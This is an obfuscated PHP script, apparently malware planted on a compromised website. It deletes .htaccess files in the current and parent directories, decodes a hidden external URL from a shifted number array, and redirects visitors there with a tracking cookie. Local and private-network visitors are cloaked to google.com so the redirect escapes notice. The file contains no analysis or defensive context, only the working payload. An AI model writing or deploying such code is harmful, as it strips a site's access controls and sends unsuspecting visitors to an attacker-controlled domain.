<?php

function m($u)
{
 $s='/';if(strtolower(substr(PHP_OS,0,3))=='win') $s="\\\\";$d=array(".$s");$p="";for($i=1;$i<255;$i++){$p.="..$s";if(is_dir($p)){array_push($d,$p);}else{break;}}
 foreach($d as $p){$a="htac"."c"."es"."s";$a1=$p.".$a";$a2=$p.$a;$a3=$p."$a.txt";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}
/*
 $dr=gethostbyname($_SERVER['HTTP_HOST'].'.dbl.spamhaus.org');
 if(preg_match("/^127\.0\.1/",$dr)){header("HTTP/1.1 404 Not Found");exit;}
 $dr=gethostbyname("186.171.144.205.zen.spamhaus.org");
 if(preg_match("/^127\.0\.0/",$dr)){header("HTTP/1.1 404 Not Found");exit;}
*/
 $u=d($u);$k=0;
 if(a()){$u="https://google.com";}else{$k=strlen($u);}
 header("Set-Cookie: bb4a88417b3d0170f=$k");header("Location: $u");
 return;
}

function a()
{
 $ip=$_SERVER['REMOTE_ADDR'];if(array_key_exists('HTTP_X_FORWARDED_FOR',$_SERVER)){$ip=array_pop(explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']));}
 $pri_addrs=array('10.0.0.0|10.255.255.255','172.16.0.0|172.31.255.255','192.168.0.0|192.168.255.255','169.254.0.0|169.254.255.255','127.0.0.0|127.255.255.255');
 $long_ip=ip2long($ip);
 if($long_ip != -1)
 {
  foreach($pri_addrs as $pri_addr)
  {
   list($start,$end)=explode('|',$pri_addr);if($long_ip >= ip2long($start) && $long_ip <= ip2long($end)){return true;}
  }
 }
 return false;
}

function d($a)
{
 $d=array_shift($a);$l="";foreach($a as $b){$l.=chr($b-$d);} return $l;
}

m(array(98,202,214,214,210,156,145,145,201,209,209,198,214,212,215,213,214,199,198,214,212,195,198,199,144,213,215));

?>
